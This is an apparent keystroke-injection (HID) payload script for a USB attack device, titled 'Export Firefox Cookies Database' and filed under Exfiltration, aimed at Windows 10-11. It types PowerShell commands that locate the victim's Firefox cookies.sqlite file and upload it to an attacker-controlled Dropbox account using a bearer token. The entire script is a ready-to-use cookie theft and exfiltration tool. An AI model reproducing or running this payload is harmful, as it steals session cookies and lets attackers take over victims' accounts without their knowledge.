####################################################
#                                                  #
# Title        : Export Firefox Cookies Database   #
# Author       : Aleff                             #
# Version      : 1.0                               #
# Category     : Exfiltration                      #
# Target       : Windows 10-11                     #
#                                                  #
####################################################

ATTACKMODE HID

# REQUIREMENTS
#  - Firefox must be installed

# VARIABLES
# - You must define your Dropbox accessToken or modify the exfiltration modality. Replace just the example word with your token.
DROPBOX_ACCESS_TOKEN='example'

QUACK DELAY 1000
QUACK GUI r
QUACK DELAY 500
QUACK STRING powershell
QUACK DELAY 500
QUACK ENTER
QUACK DELAY 2000

# Get cookies DB path
QUACK STRING \$firefoxProfilePath = Join-Path -Path \$env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles'
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$firefoxProfile = Get-ChildItem -Path \$firefoxProfilePath | Where-Object {\$_.Name -like \"*default-release\"}
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$filePath = Join-Path -Path \$firefoxProfile.FullName -ChildPath 'cookies.sqlite'
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$uploadUrl = \"https://content.dropboxapi.com/2/files/upload\"
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$dropboxFilePath = \"/cookies_exported.sqlite\"
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$headers = @{}
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$headers.Add(\"Authorization\", \"Bearer $DROPBOX_ACCESS_TOKEN\")
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$headers.Add(\"Dropbox-API-Arg\", '{\"path\": \$dropboxFilePath,\"mode\":\"add\",\"autorename\":true,\"mute\":false}')
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$headers.Add(\"Content-Type\", \"application/octet-stream\")
QUACK ENTER
QUACK DELAY 500
QUACK STRING Invoke-RestMethod -Uri \$uploadUrl -Headers \$headers -Method Post -Body \$filePath; exit;
QUACK ENTER